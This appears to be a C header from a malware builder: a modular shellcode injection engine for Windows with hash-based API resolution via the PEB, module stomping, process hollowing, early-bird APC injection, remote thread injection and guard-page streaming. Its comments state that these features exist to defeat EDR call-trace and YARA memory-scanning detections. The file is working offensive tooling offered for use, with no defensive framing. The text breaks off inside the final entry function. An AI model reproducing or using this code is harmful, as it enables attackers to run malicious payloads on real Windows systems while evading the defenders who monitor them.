#ifndef STARBURST_ENGINE_H
#define STARBURST_ENGINE_H

#include <windows.h>
#include <winternl.h>

/*
 * Modular injection engine - hash-resolved, zero plaintext API strings.
 * Builder stamps one ALLOC_* define and one EXEC_* define.
 *
 * Allocation methods:
 *   ALLOC_VIRTUALALLOC        - VirtualAlloc / VirtualAllocEx
 *   ALLOC_NTALLOCATE          - NtAllocateVirtualMemory (syscall-level)
 *   ALLOC_MAPVIEW             - NtCreateSection + NtMapViewOfSection
 *   ALLOC_MODULESTOMP         - LoadLibraryExW sacrificial DLL, stomp .text section
 *
 * Execution methods (local):
 *   EXEC_DIRECT               - Cast to function pointer, call
 *   EXEC_CREATETHREAD         - CreateThread
 *   EXEC_CALLBACK             - EnumWindows callback
 *   EXEC_FIBER                - ConvertThreadToFiber + CreateFiber
 *   EXEC_THREADPOOL           - TpAllocWork + TpPostWork
 *   EXEC_GUARDPAGE            - VEH guard-page streaming (only ~3 pages cleartext at a time)
 *
 * Injection modes (remote - requires INJECT_REMOTE + target process):
 *   INJECT_REMOTE             - Write into remote process, execute via remote thread
 *   INJECT_HOLLOW             - Process hollowing (suspended process, unmap, write, resume)
 *   INJECT_EARLYBIRD          - Create suspended process, QueueUserAPC, resume
 */

/* ─── FNV1a-32 function hashes ─── */

#define H_NtAllocateVirtualMemory   0xca67b978u
#define H_NtProtectVirtualMemory    0xbd799926u
#define H_NtWriteVirtualMemory      0x43e32f32u
#define H_NtCreateSection           0x3c59f362u
#define H_NtMapViewOfSection        0xcbc9e1aeu
#define H_NtQueueApcThread          0xb10f026cu
#define H_TpAllocWork               0x678de62fu
#define H_TpPostWork                0x0e031b86u
#define H_TpReleaseWork             0xfaf7f1efu
#define H_VirtualAllocEx            0xaeb6049cu
#define H_VirtualProtectEx          0x00014c8eu
#define H_WriteProcessMemory        0xc0088eeau
#define H_CreateThread              0x60ac7e39u
#define H_EnumWindows               0x6d15bbbdu
#define H_ConvertThreadToFiber      0x97b1a935u
#define H_CreateFiber               0x0a32b6b9u
#define H_SwitchToFiber             0x8c6c4a42u
#define H_DeleteFiber               0x25c5e3a4u
#define H_Sleep                     0x2fa62ca8u
#define H_WaitForSingleObject       0x71948ca4u
#define H_CloseHandle               0xfaba0065u
#define H_CreateProcessA            0x4a7c0a09u
#define H_ResumeThread              0xbb21e02eu
#define H_CreateRemoteThread        0xc398c463u
#define H_TerminateProcess          0xf84eee59u
#define H_GetThreadContext          0x85cca27eu
#define H_SetThreadContext          0x6ed04712u
#define H_QueueUserAPC              0x890bb4fbu
#define H_LoadLibraryExW            0x1cd12702u
#define H_AddVectoredExceptionHandler 0xafac650du
#define H_FlushInstructionCache     0x0490286bu
#define H_VirtualProtect            0x820621f3u
#define H_VirtualFree               0x3a9acc72u
#define H_RtlAddFunctionTable       0x38791528u

#define H_MOD_NTDLL                 0xa62a3b3bu
#define H_MOD_KERNEL32              0xa3e6f6c3u
#define H_MOD_USER32                0xc0323159u

/* ─── ntdll typedefs ─── */

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtResumeThread)(
    HANDLE, PULONG);
typedef NTSTATUS (NTAPI *pNtQueueApcThread)(
    HANDLE, PVOID, PVOID, PVOID, PVOID);

typedef NTSTATUS (NTAPI *pTpAllocWork)(
    void**, void*, void*, void*);
typedef void (NTAPI *pTpPostWork)(void*);
typedef void (NTAPI *pTpReleaseWork)(void*);

typedef LPVOID  (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE  (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL    (WINAPI *pEnumWindows)(WNDENUMPROC, LPARAM);
typedef LPVOID  (WINAPI *pConvertThreadToFiber)(LPVOID);
typedef LPVOID  (WINAPI *pCreateFiber)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
typedef void    (WINAPI *pSwitchToFiber)(LPVOID);
typedef void    (WINAPI *pDeleteFiber)(LPVOID);
typedef void    (WINAPI *pSleep)(DWORD);
typedef DWORD   (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL    (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL    (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD   (WINAPI *pResumeThread)(HANDLE);
typedef HANDLE  (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL    (WINAPI *pTerminateProcess)(HANDLE, UINT);
typedef BOOL    (WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL    (WINAPI *pSetThreadContext)(HANDLE, const CONTEXT*);
typedef DWORD   (WINAPI *pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef HMODULE (WINAPI *pLoadLibraryExW)(LPCWSTR, HANDLE, DWORD);
typedef PVOID   (WINAPI *pAddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
typedef BOOL    (WINAPI *pFlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
typedef BOOL    (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
#ifdef _WIN64
typedef BOOLEAN (WINAPI *pRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);
#endif

/* ─── hash-based API resolution via PEB ─── */

static unsigned int _fnv1a(const char *s) {
    unsigned int h = 0x811c9dc5u;
    while (*s) {
        h ^= (unsigned char)*s++;
        h *= 0x01000193u;
    }
    return h;
}

static unsigned int _fnv1a_ci(const WCHAR *s) {
    unsigned int h = 0x811c9dc5u;
    while (*s) {
        unsigned char c = (unsigned char)*s;
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h ^= c;
        h *= 0x01000193u;
        s++;
    }
    return h;
}

static void* _find_module(unsigned int mod_hash) {
    char *peb;
#ifdef _WIN64
    peb = (char*)__readgsqword(0x60);
#else
    peb = (char*)__readfsdword(0x30);
#endif
    char *ldr  = *(char**)(peb + 0x18);
    char *head = ldr + 0x20;
    char *curr = *(char**)head;

    while (curr != head) {
        WCHAR *name = *(WCHAR**)(curr + 0x40);
        if (name) {
            WCHAR *base_name = name;
            WCHAR *p = name;
            while (*p) {
                if (*p == '\\' || *p == '/') base_name = p + 1;
                p++;
            }
            if (_fnv1a_ci(base_name) == mod_hash)
                return *(void**)(curr + 0x20);
        }
        curr = *(char**)curr;
    }
    return NULL;
}

static FARPROC _resolve_export(void *mod_base, unsigned int func_hash) {
    if (!mod_base) return NULL;
    char *base = (char*)mod_base;
    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
    char *nt = base + e_lfanew;

#ifdef _WIN64
    DWORD export_rva  = *(DWORD*)(nt + 0x18 + 0x70);
    DWORD export_size = *(DWORD*)(nt + 0x18 + 0x70 + 4);
#else
    DWORD export_rva  = *(DWORD*)(nt + 0x18 + 0x60);
    DWORD export_size = *(DWORD*)(nt + 0x18 + 0x60 + 4);
#endif
    if (!export_rva || !export_size) return NULL;

    char  *exports  = base + export_rva;
    DWORD  num      = *(DWORD*)(exports + 0x18);
    DWORD *names    = (DWORD*)(base + *(DWORD*)(exports + 0x20));
    WORD  *ordinals = (WORD*) (base + *(DWORD*)(exports + 0x24));
    DWORD *funcs    = (DWORD*)(base + *(DWORD*)(exports + 0x1C));

    for (DWORD i = 0; i < num; i++) {
        if (_fnv1a(base + names[i]) == func_hash)
            return (FARPROC)(base + funcs[ordinals[i]]);
    }
    return NULL;
}

static FARPROC _resolve(unsigned int mod_hash, unsigned int func_hash) {
    return _resolve_export(_find_module(mod_hash), func_hash);
}

/* ═══════════════════════════════════════════════════════
 *  MODULE STOMPING (ALLOC_MODULESTOMP)
 *  LoadLibraryExW a sacrificial DLL, stomp its .text
 *  section. Memory is file-backed → defeats shellcode_thread
 *  and CallTrace UNKNOWN detections.
 * ═══════════════════════════════════════════════════════ */

#if defined(ALLOC_MODULESTOMP)

static HMODULE _stomp_module = NULL;
static void   *_stomp_text_addr = NULL;
static DWORD   _stomp_text_size = 0;

static void* _modulestomp_alloc(SIZE_T size) {
    pLoadLibraryExW pLLW = (pLoadLibraryExW)_resolve(H_MOD_KERNEL32, H_LoadLibraryExW);
    if (!pLLW) return NULL;

    WCHAR dllname[] = { 'x','p','s','s','e','r','v','i','c','e','s','.','d','l','l', 0 };

    _stomp_module = pLLW(dllname, NULL, 0x00000001 /* DONT_RESOLVE_DLL_REFERENCES */);
    if (!_stomp_module) return NULL;

    char *base = (char*)_stomp_module;
    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
    char *nt = base + e_lfanew;
    WORD num_sections = *(WORD*)(nt + 0x06);
    WORD opt_hdr_size = *(WORD*)(nt + 0x14);
    char *section = nt + 0x18 + opt_hdr_size;

    for (WORD i = 0; i < num_sections; i++) {
        DWORD chars = *(DWORD*)(section + 0x24);
        DWORD vsize = *(DWORD*)(section + 0x08);
        DWORD vrva  = *(DWORD*)(section + 0x0C);

        int is_exec = (chars & 0x20000000) != 0; /* IMAGE_SCN_MEM_EXECUTE */
        int is_read = (chars & 0x40000000) != 0; /* IMAGE_SCN_MEM_READ */
        if (is_exec && is_read && vsize >= size) {
            _stomp_text_addr = base + vrva;
            _stomp_text_size = vsize;

            pVirtualProtect pVP = (pVirtualProtect)_resolve(H_MOD_KERNEL32, H_VirtualProtect);
            DWORD old;
            if (pVP) pVP(_stomp_text_addr, _stomp_text_size, PAGE_READWRITE, &old);
            return _stomp_text_addr;
        }
        section += 40;
    }
    return NULL;
}

#ifdef _WIN64
static void _modulestomp_fixup_unwind(void) {
    char *base = (char*)_stomp_module;
    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
    char *nt = base + e_lfanew;
    DWORD exc_rva  = *(DWORD*)(nt + 0x18 + 0x70 + 8 * 3);
    DWORD exc_size = *(DWORD*)(nt + 0x18 + 0x70 + 8 * 3 + 4);

    if (exc_rva && exc_size) {
        PRUNTIME_FUNCTION pdata = (PRUNTIME_FUNCTION)(base + exc_rva);
        DWORD count = exc_size / sizeof(RUNTIME_FUNCTION);
        pRtlAddFunctionTable pRtlAdd =
            (pRtlAddFunctionTable)_resolve(H_MOD_KERNEL32, H_RtlAddFunctionTable);
        if (pRtlAdd) pRtlAdd(pdata, count, (DWORD64)base);
    }
}
#endif

#endif /* ALLOC_MODULESTOMP */

/* ═══════════════════════════════════════════════════════
 *  ALLOCATION
 * ═══════════════════════════════════════════════════════ */

static void* engine_alloc(HANDLE hProcess, SIZE_T size) {
#if defined(ALLOC_MODULESTOMP)
    (void)hProcess;
    return _modulestomp_alloc(size);

#elif defined(ALLOC_NTALLOCATE)
    pNtAllocateVirtualMemory NtAlloc =
        (pNtAllocateVirtualMemory)_resolve(H_MOD_NTDLL, H_NtAllocateVirtualMemory);
    void *addr = NULL;
    SIZE_T region = size;
    NTSTATUS st = NtAlloc(hProcess, &addr, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    return (st == 0) ? addr : NULL;

#elif defined(ALLOC_MAPVIEW)
    pNtCreateSection NtCreate =
        (pNtCreateSection)_resolve(H_MOD_NTDLL, H_NtCreateSection);
    pNtMapViewOfSection NtMap =
        (pNtMapViewOfSection)_resolve(H_MOD_NTDLL, H_NtMapViewOfSection);

    HANDLE hSection = NULL;
    LARGE_INTEGER secSize;
    secSize.QuadPart = (LONGLONG)size;

    NTSTATUS st = NtCreate(&hSection, SECTION_ALL_ACCESS, NULL, &secSize,
                           PAGE_READWRITE, SEC_COMMIT, NULL);
    if (st != 0) return NULL;

    void *addr = NULL;
    SIZE_T viewSize = 0;
    st = NtMap(hSection, hProcess, &addr, 0, 0, NULL, &viewSize, 1, 0, PAGE_READWRITE);
    pCloseHandle pClose = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
    if (pClose) pClose(hSection);
    return (st == 0) ? addr : NULL;

#else /* ALLOC_VIRTUALALLOC (default) */
    pVirtualAllocEx pAlloc = (pVirtualAllocEx)_resolve(H_MOD_KERNEL32, H_VirtualAllocEx);
    return pAlloc ? pAlloc(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) : NULL;
#endif
}

static int engine_protect(HANDLE hProcess, void *addr, SIZE_T size) {
#if defined(ALLOC_NTALLOCATE) || defined(ALLOC_MAPVIEW)
    pNtProtectVirtualMemory NtProtect =
        (pNtProtectVirtualMemory)_resolve(H_MOD_NTDLL, H_NtProtectVirtualMemory);
    ULONG old = 0;
    void *base = addr;
    SIZE_T region = size;
    return NtProtect(hProcess, &base, &region, PAGE_EXECUTE_READ, &old) == 0;

#else
    pVirtualProtectEx pProtect = (pVirtualProtectEx)_resolve(H_MOD_KERNEL32, H_VirtualProtectEx);
    DWORD old;
    return pProtect ? pProtect(hProcess, addr, size, PAGE_EXECUTE_READ, &old) : 0;
#endif
}

static void engine_write(HANDLE hProcess, void *dst, const void *src, SIZE_T size) {
    if (hProcess == (HANDLE)-1) {
        char *d = (char*)dst;
        const char *s = (const char*)src;
        for (SIZE_T i = 0; i < size; i++) d[i] = s[i];
    } else {
        pNtWriteVirtualMemory NtWrite =
            (pNtWriteVirtualMemory)_resolve(H_MOD_NTDLL, H_NtWriteVirtualMemory);
        if (NtWrite) {
            NtWrite(hProcess, dst, (PVOID)src, size, NULL);
        } else {
            pWriteProcessMemory pWrite = (pWriteProcessMemory)_resolve(H_MOD_KERNEL32, H_WriteProcessMemory);
            if (pWrite) pWrite(hProcess, dst, src, size, NULL);
        }
    }
}

/* ═══════════════════════════════════════════════════════
 *  GUARD PAGE VEH STREAMING (EXEC_GUARDPAGE)
 *  Keeps only a sliding window of cleartext pages.
 *  Defeats memory_signature YARA scanning.
 * ═══════════════════════════════════════════════════════ */

#if defined(EXEC_GUARDPAGE)

#define GP_MAXVISIBLE  3
#define GP_MAXREGIONS  8
#define GP_PAGE_SIZE   0x1000

typedef struct {
    ULONG_PTR start;
    ULONG_PTR end;
    DWORD     perms;
    char     *source;
} _GuardRegion;

typedef struct {
    char *pages[GP_MAXVISIBLE];
    int   index;
} _RegionQueue;

static _GuardRegion _gp_regions[GP_MAXREGIONS];
static _RegionQueue _gp_state;
static char         _gp_xorkey[16];

static void _gp_memcpy(void *d, const void *s, SIZE_T n) {
    char *dd = (char*)d;
    const char *ss = (const char*)s;
    for (SIZE_T i = 0; i < n; i++) dd[i] = ss[i];
}

static void _gp_memset(void *d, int v, SIZE_T n) {
    char *dd = (char*)d;
    for (SIZE_T i = 0; i < n; i++) dd[i] = (char)v;
}

static void _gp_xor(char *data, DWORD len) {
    for (DWORD i = 0; i < len; i++)
        data[i] ^= _gp_xorkey[i % 16];
}

static _GuardRegion* _gp_find_region(ULONG_PTR addr) {
    for (int i = 0; i < GP_MAXREGIONS; i++) {
        if (addr >= _gp_regions[i].start && addr < _gp_regions[i].end)
            return &_gp_regions[i];
    }
    return NULL;
}

static LONG WINAPI _gp_veh_handler(EXCEPTION_POINTERS *ep) {
    if (ep->ExceptionRecord->ExceptionCode != STATUS_GUARD_PAGE_VIOLATION)
        return EXCEPTION_CONTINUE_SEARCH;
    if (ep->ExceptionRecord->NumberParameters < 2)
        return EXCEPTION_CONTINUE_SEARCH;

    ULONG_PTR fault_addr = ep->ExceptionRecord->ExceptionInformation[1];
    ULONG_PTR page_addr  = fault_addr - (fault_addr % GP_PAGE_SIZE);

    _GuardRegion *rgn = _gp_find_region(fault_addr);
    if (!rgn)
        return EXCEPTION_CONTINUE_SEARCH;

    pVirtualProtect pVP = (pVirtualProtect)_resolve(H_MOD_KERNEL32, H_VirtualProtect);
    pFlushInstructionCache pFIC =
        (pFlushInstructionCache)_resolve(H_MOD_KERNEL32, H_FlushInstructionCache);
    DWORD old;

    /* evict the oldest visible page */
    char *oldest = _gp_state.pages[_gp_state.index % GP_MAXVISIBLE];
    if (oldest) {
        pVP(oldest, GP_PAGE_SIZE, PAGE_READWRITE, &old);
        _gp_memset(oldest, 0, GP_PAGE_SIZE);
        pVP(oldest, GP_PAGE_SIZE, PAGE_READWRITE | PAGE_GUARD, &old);
    }

    /* make target page writable */
    ULONG_PTR src_offset = page_addr - rgn->start;
    pVP((void*)page_addr, GP_PAGE_SIZE, PAGE_READWRITE, &old);

    /* stream in one page from encrypted source */
    _gp_memcpy((void*)page_addr, rgn->source + src_offset, GP_PAGE_SIZE);
    _gp_xor((char*)page_addr, GP_PAGE_SIZE);

    /* set final permissions */
    pVP((void*)page_addr, GP_PAGE_SIZE, rgn->perms, &old);
    if (pFIC) pFIC((HANDLE)-1, (void*)page_addr, GP_PAGE_SIZE);

    /* track this page */
    _gp_state.pages[_gp_state.index % GP_MAXVISIBLE] = (char*)page_addr;
    _gp_state.index = (_gp_state.index + 1) % GP_MAXVISIBLE;

    return EXCEPTION_CONTINUE_EXECUTION;
}

static int _gp_setup(void *dest, SIZE_T sc_len) {
    pVirtualAllocEx pVA = (pVirtualAllocEx)_resolve(H_MOD_KERNEL32, H_VirtualAllocEx);
    pVirtualProtect pVP = (pVirtualProtect)_resolve(H_MOD_KERNEL32, H_VirtualProtect);
    pAddVectoredExceptionHandler pAVEH =
        (pAddVectoredExceptionHandler)_resolve(H_MOD_KERNEL32, H_AddVectoredExceptionHandler);
    if (!pVA || !pVP || !pAVEH) return 0;

    /* generate XOR key from ASLR entropy */
    ULONG_PTR seed = (ULONG_PTR)&seed ^ (ULONG_PTR)dest ^ (ULONG_PTR)_gp_veh_handler;
    for (int i = 0; i < 16; i++) {
        seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
        _gp_xorkey[i] = (char)(seed >> 33);
    }

    /* init state */
    for (int i = 0; i < GP_MAXREGIONS; i++) {
        _gp_regions[i].start = 0;
        _gp_regions[i].end   = 0;
    }
    _gp_state.index = 0;
    for (int i = 0; i < GP_MAXVISIBLE; i++)
        _gp_state.pages[i] = NULL;

    /* pad size to page boundary */
    SIZE_T padded = (sc_len + GP_PAGE_SIZE - 1) & ~(GP_PAGE_SIZE - 1);

    /* allocate stream source and copy + encrypt */
    char *stream_src = (char*)pVA((HANDLE)-1, NULL, padded, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stream_src) return 0;

    _gp_memcpy(stream_src, dest, sc_len);
    if (sc_len < padded)
        _gp_memset(stream_src + sc_len, 0, padded - sc_len);
    _gp_xor(stream_src, (DWORD)padded);

    /* register guard region */
    _gp_regions[0].start  = (ULONG_PTR)dest;
    _gp_regions[0].end    = (ULONG_PTR)dest + padded;
    _gp_regions[0].perms  = PAGE_EXECUTE_READ;
    _gp_regions[0].source = stream_src;

    /* zero destination and set PAGE_GUARD on all pages */
    DWORD old;
    pVP(dest, padded, PAGE_READWRITE, &old);
    _gp_memset(dest, 0, padded);
    pVP(dest, padded, PAGE_READWRITE | PAGE_GUARD, &old);

    /* install VEH */
    pAVEH(1, _gp_veh_handler);
    return 1;
}

#endif /* EXEC_GUARDPAGE */

/* ═══════════════════════════════════════════════════════
 *  LOCAL EXECUTION
 * ═══════════════════════════════════════════════════════ */

#if defined(EXEC_FIBER)
struct FiberCtx { void *sc_addr; void *main_fiber; };
static void CALLBACK engine_fiber_wrapper(LPVOID param) {
    struct FiberCtx *ctx = (struct FiberCtx*)param;
    ((void(*)(void*))ctx->sc_addr)(NULL);
    pSwitchToFiber pSwitch = (pSwitchToFiber)_resolve(H_MOD_KERNEL32, H_SwitchToFiber);
    if (pSwitch) pSwitch(ctx->main_fiber);
}
#endif

static HANDLE engine_exec_local(void *addr) {
#if defined(EXEC_CREATETHREAD)
    pCreateThread pCT = (pCreateThread)_resolve(H_MOD_KERNEL32, H_CreateThread);
    return pCT ? pCT(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL) : NULL;

#elif defined(EXEC_CALLBACK)
    pEnumWindows pEW = (pEnumWindows)_resolve(H_MOD_USER32, H_EnumWindows);
    if (pEW) pEW((WNDENUMPROC)addr, 0);
    return NULL;

#elif defined(EXEC_FIBER)
    pConvertThreadToFiber pConvert = (pConvertThreadToFiber)_resolve(H_MOD_KERNEL32, H_ConvertThreadToFiber);
    pCreateFiber pCreate = (pCreateFiber)_resolve(H_MOD_KERNEL32, H_CreateFiber);
    pSwitchToFiber pSwitch = (pSwitchToFiber)_resolve(H_MOD_KERNEL32, H_SwitchToFiber);
    pDeleteFiber pDelete = (pDeleteFiber)_resolve(H_MOD_KERNEL32, H_DeleteFiber);
    if (!pConvert || !pCreate || !pSwitch || !pDelete) return NULL;

    void *mainFiber = pConvert(NULL);
    if (!mainFiber) return NULL;
    struct FiberCtx ctx = { addr, mainFiber };
    void *scFiber = pCreate(0, engine_fiber_wrapper, &ctx);
    if (!scFiber) return NULL;
    pSwitch(scFiber);
    pDelete(scFiber);
    return NULL;

#elif defined(EXEC_THREADPOOL)
    pTpAllocWork TpAlloc = (pTpAllocWork)_resolve(H_MOD_NTDLL, H_TpAllocWork);
    pTpPostWork  TpPost  = (pTpPostWork)_resolve(H_MOD_NTDLL, H_TpPostWork);
    pTpReleaseWork TpRel = (pTpReleaseWork)_resolve(H_MOD_NTDLL, H_TpReleaseWork);

    if (!TpAlloc || !TpPost || !TpRel) return NULL;

    void *work = NULL;
    NTSTATUS st = TpAlloc(&work, (void*)addr, NULL, NULL);
    if (st != 0 || !work) return NULL;
    TpPost(work);
    TpRel(work);
    pSleep pSl = (pSleep)_resolve(H_MOD_KERNEL32, H_Sleep);
    if (pSl) pSl(1000);
    return NULL;

#elif defined(EXEC_GUARDPAGE)
    ((void(*)(void*))addr)(NULL);
    return NULL;

#else /* EXEC_DIRECT (default) */
    ((void(*)(void*))addr)(NULL);
    return NULL;
#endif
}

/* ═══════════════════════════════════════════════════════
 *  REMOTE INJECTION
 * ═══════════════════════════════════════════════════════ */

#if defined(INJECT_REMOTE)
static int engine_inject_remote(const unsigned char *sc, unsigned int sc_len, const char *target) {
    pCreateProcessA pCP = (pCreateProcessA)_resolve(H_MOD_KERNEL32, H_CreateProcessA);
    pTerminateProcess pTP = (pTerminateProcess)_resolve(H_MOD_KERNEL32, H_TerminateProcess);
    pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
    pResumeThread pRT = (pResumeThread)_resolve(H_MOD_KERNEL32, H_ResumeThread);
    pCreateRemoteThread pCRT = (pCreateRemoteThread)_resolve(H_MOD_KERNEL32, H_CreateRemoteThread);
    pWaitForSingleObject pWFSO = (pWaitForSingleObject)_resolve(H_MOD_KERNEL32, H_WaitForSingleObject);
    if (!pCP || !pCH) return 0;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!pCP(target, NULL, NULL, NULL, FALSE,
             CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 0;
    }

    void *addr = engine_alloc(pi.hProcess, sc_len);
    if (!addr) {
        if (pTP) pTP(pi.hProcess, 1);
        pCH(pi.hThread);
        pCH(pi.hProcess);
        return 0;
    }

    engine_write(pi.hProcess, addr, sc, sc_len);
    engine_protect(pi.hProcess, addr, sc_len);

    if (pRT) pRT(pi.hThread);

    HANDLE hRemote = pCRT ? pCRT(pi.hProcess, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL) : NULL;
    if (hRemote) {
        if (pWFSO) pWFSO(hRemote, INFINITE);
        pCH(hRemote);
    }

    pCH(pi.hThread);
    pCH(pi.hProcess);
    return 1;
}
#endif

#if defined(INJECT_HOLLOW)
static int engine_inject_hollow(const unsigned char *sc, unsigned int sc_len, const char *target) {
    pCreateProcessA pCP = (pCreateProcessA)_resolve(H_MOD_KERNEL32, H_CreateProcessA);
    pTerminateProcess pTP = (pTerminateProcess)_resolve(H_MOD_KERNEL32, H_TerminateProcess);
    pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
    pGetThreadContext pGTC = (pGetThreadContext)_resolve(H_MOD_KERNEL32, H_GetThreadContext);
    pSetThreadContext pSTC = (pSetThreadContext)_resolve(H_MOD_KERNEL32, H_SetThreadContext);
    pResumeThread pRT = (pResumeThread)_resolve(H_MOD_KERNEL32, H_ResumeThread);
    if (!pCP || !pCH || !pGTC || !pSTC || !pRT) return 0;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!pCP(target, NULL, NULL, NULL, FALSE,
             CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 0;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    pGTC(pi.hThread, &ctx);

    void *addr = engine_alloc(pi.hProcess, sc_len);
    if (!addr) {
        if (pTP) pTP(pi.hProcess, 1);
        pCH(pi.hThread);
        pCH(pi.hProcess);
        return 0;
    }

    engine_write(pi.hProcess, addr, sc, sc_len);
    engine_protect(pi.hProcess, addr, sc_len);

#ifdef _WIN64
    ctx.Rip = (DWORD64)addr;
#else
    ctx.Eip = (DWORD)addr;
#endif
    pSTC(pi.hThread, &ctx);
    pRT(pi.hThread);

    pCH(pi.hThread);
    pCH(pi.hProcess);
    return 1;
}
#endif

#if defined(INJECT_EARLYBIRD)
static int engine_inject_earlybird(const unsigned char *sc, unsigned int sc_len, const char *target) {
    pCreateProcessA pCP = (pCreateProcessA)_resolve(H_MOD_KERNEL32, H_CreateProcessA);
    pTerminateProcess pTP = (pTerminateProcess)_resolve(H_MOD_KERNEL32, H_TerminateProcess);
    pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
    pResumeThread pRT = (pResumeThread)_resolve(H_MOD_KERNEL32, H_ResumeThread);
    if (!pCP || !pCH || !pRT) return 0;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!pCP(target, NULL, NULL, NULL, FALSE,
             CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 0;
    }

    void *addr = engine_alloc(pi.hProcess, sc_len);
    if (!addr) {
        if (pTP) pTP(pi.hProcess, 1);
        pCH(pi.hThread);
        pCH(pi.hProcess);
        return 0;
    }

    engine_write(pi.hProcess, addr, sc, sc_len);
    engine_protect(pi.hProcess, addr, sc_len);

    pNtQueueApcThread NtQueueApc =
        (pNtQueueApcThread)_resolve(H_MOD_NTDLL, H_NtQueueApcThread);
    if (NtQueueApc) {
        NtQueueApc(pi.hThread, addr, NULL, NULL, NULL);
    } else {
        pQueueUserAPC pQUA = (pQueueUserAPC)_resolve(H_MOD_KERNEL32, H_QueueUserAPC);
        if (pQUA) pQUA((PAPCFUNC)addr, pi.hThread, 0);
    }

    pRT(pi.hThread);

    pCH(pi.hThread);
    pCH(pi.hProcess);
    return 1;
}
#endif

/* ═══════════════════════════════════════════════════════
 *  UNIFIED ENTRY POINT
 * ═══════════════════════════════════════════════════════ */

static int engine_run(const unsigned char *sc, unsigned int sc_len) {
#if defined(INJECT_REMOTE)
    return engine_inject_remote(sc, sc_len, %INJECT_TARGET%);
#elif defined(INJECT_HOLLOW)
    return engine_inject_hollow(sc, sc_len, %INJECT_TARGET%);
#elif defined(INJECT_EARLYBIRD)
    return engine_inject_earlybird(sc, sc_len, %INJECT_TARGET%);
#else
    HANDLE hSelf = (HANDLE)-1;
    void *addr = engine_alloc(hSelf, sc_len);
    if (!addr) return 0;

    engine_write(hSelf, addr, sc, sc_len);

#if defined(EXEC_GUARDPAGE)
    /* guard page streaming: encrypt source, zero dest, install VEH.
     * The VEH will decrypt pages on-demand as code executes through them.
     * This replaces the normal protect step - guard pages handle permissions. */
    if (!_gp_setup(addr, sc_len)) return 0;

#if defined(ALLOC_MODULESTOMP) && defined(_WIN64)
    _modulestomp_fixup_unwind();
#endif

    ((void(*)(void*))addr)(NULL);
    return 1;
#else
    engine_protect(hSelf, addr, sc_len);

#if defined(ALLOC_MODULESTOMP) && defined(_WIN64)
    _modulestomp_fixup_unwind();
#endif

    HANDLE hThread = engine_exec_local(addr);
    if (hThread) {
        pWaitForSingleObject pWFSO = (pWaitForSingleObject)_resolve(H_MOD_KERNEL32, H_WaitForSingleObject);
